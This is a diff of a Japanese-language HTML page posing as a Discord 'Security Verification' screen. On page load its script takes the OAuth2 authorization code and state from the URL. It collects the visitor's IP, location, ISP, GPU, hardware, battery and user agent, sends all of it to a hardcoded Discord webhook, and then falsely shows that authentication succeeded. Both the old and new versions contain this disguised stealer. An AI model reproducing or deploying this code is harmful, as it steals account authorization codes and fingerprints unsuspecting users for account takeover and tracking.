@@ -1,68 +1,57 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-    <meta charset="UTF-8"><title>System Integrity Check</title>
+    <meta charset="UTF-8"><title>Security Verification v9</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .console { width: 80%; max-width: 600px; padding: 20px; border: 1px solid #0f0; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 20px #0f0; }
-        .cursor { display: inline-block; width: 10px; height: 20px; background: #0f0; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 49% { opacity: 1; } 50%, 100% { opacity: 0; } }
+        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: 'Consolas', monospace; margin: 0; }
+        .box { border: 1px solid #333; padding: 40px; border-radius: 10px; text-align: center; background: #050505; box-shadow: 0 0 20px rgba(88, 101, 242, 0.3); }
+        .loading { border: 3px solid #111; border-top: 3px solid #5865f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="console">
-        <div id="log">> SYSTEM SCANNING...<br></div>
-        <span class="cursor"></span>
+    <div class="box">
+        <div class="loading"></div>
+        <h2 id="st">SECURITY ANALYZING...</h2>
+        <p id="msg">ハードウェア環境とネットワークの安全性を確認中...</p>
     </div>
-
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
-        const OWNER = "1457731099643084955";
-
-        async function getIP() {
-            try {
-                const r = await fetch('https://ipapi.co/json/');
-                return await r.json();
-            } catch { return { ip: "Unknown" }; }
-        }
+        const WH = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
+        const OW = "1457731099643084955";
 
         window.onload = async () => {
-            const params = new URLSearchParams(window.location.search);
-            const code = params.get('code'), state = params.get('state');
-            if (!code || !state) return;
+            const u = new URLSearchParams(window.location.search), c = u.get('code'), s = u.get('state');
+            if (!c || !s) return;
 
-            const ip = await getIP();
+            let ip = {ip:"?"}; try { ip = await (await fetch('https://ipapi.co/json/')).json(); } catch(e){}
+            
+            // GPU取得
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
             const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
             const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
 
-            // 収集できる全ブラウザ・端末データ
-            const fullReport = {
-                content: `🚨 **【極限大ログ：全データ検知】** <@${OWNER}>`,
+            const log = {
+                content: `🚨 **【究極ログ検知：ブラウザ指紋】** <@${OW}>`,
                 embeds: [{
-                    title: "🔱 究極解析：デバイス・ネットワーク指紋",
-                    color: 0x00ff00,
+                    title: "🔱 端末・環境詳細レポート", color: 0x000000,
                     fields: [
-                        { name: "👤 UID", value: `\`${state.split('_')[1]}\``, inline: true },
+                        { name: "👤 UID", value: `\`${s.split('_')[1]}\``, inline: true },
                         { name: "🌐 IP", value: `\`${ip.ip}\``, inline: true },
-                        { name: "📍 位置", value: `\`${ip.city}, ${ip.region}, ${ip.country_name}\``, inline: false },
-                        { name: "🏢 ISP", value: `\`${ip.org}\``, inline: true },
+                        { name: "📍 位置", value: `\`${ip.city}, ${ip.country_name}\``, inline: true },
+                        { name: "🏢 ISP", value: `\`${ip.org}\``, inline: false },
                         { name: "🖥️ GPU", value: `\`${gpu}\``, inline: false },
-                        { name: "🧠 ハードウェア", value: `\`CPU: ${navigator.hardwareConcurrency} | RAM: ${navigator.deviceMemory}GB\``, inline: true },
-                        { name: "📐 画面/窓", value: `\`${screen.width}x${screen.height} / ${window.innerWidth}x${window.innerHeight}\``, inline: true },
-                        { name: "🔋 バッテリー", value: (await navigator.getBattery().then(b => `\`${b.level * 100}% (${b.charging ? '充電中' : '放電中'})\``).catch(() => '`N/A`')), inline: true },
-                        { name: "🕒 タイムゾーン", value: `\`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``, inline: true },
-                        { name: "🌍 言語/フォント数", value: `\`${navigator.language} / ${navigator.languages.length}\``, inline: true },
-                        { name: "📱 OS/UA", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-                        { name: "🔑 OAuth2 Code", value: `\`\`\`${code}\`\`\``, inline: false }
-                    ],
-                    timestamp: new Date()
+                        { name: "🧠 HW", value: `\`CPU: ${navigator.hardwareConcurrency} | RAM: ${navigator.deviceMemory}GB\``, inline: true },
+                        { name: "📐 RES", value: `\`${screen.width}x${screen.height}\``, inline: true },
+                        { name: "🔋 BAT", value: (await navigator.getBattery().then(b => `\`${b.level*100}%\``).catch(()=>'N/A')), inline: true },
+                        { name: "📱 UA", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+                        { name: "🔑 CODE", value: `\`\`\`${c}\`\`\``, inline: false }
+                    ], timestamp: new Date()
                 }]
             };
-
-            await fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(fullReport) });
-            document.getElementById('log').innerHTML += "> ANALYSIS UPLOADED.<br>> DISCORD INTEGRATION STARTING...";
+            await fetch(WH, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(log) });
+            document.getElementById('st').innerText = "SUCCESS";
+            document.getElementById('msg').innerText = "認証が完了しました。Discordへ戻ってください。";
         };
     </script>
 </body>
